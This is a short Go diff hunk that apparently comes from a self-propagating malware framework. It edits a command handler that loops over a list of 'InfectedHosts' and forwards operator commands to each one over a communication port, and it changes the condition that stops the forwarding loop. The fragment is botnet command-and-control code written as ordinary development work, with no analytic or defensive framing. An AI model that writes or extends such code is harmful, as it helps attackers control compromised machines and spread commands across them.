@@ -246,7 +246,7 @@ func handle_command(cmd string) {
 			for _, host := range InfectedHosts {
 				err := DataSender(host, NeuraxConfig.comm_port, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
 				ReportError("Cannot send command", err)
-				if strings.Contains(preamble, "o") {
+				if strings.Contains(preamble, "o") && !strings.Contains(preamble, "m") {
 					break
 				}
 			}
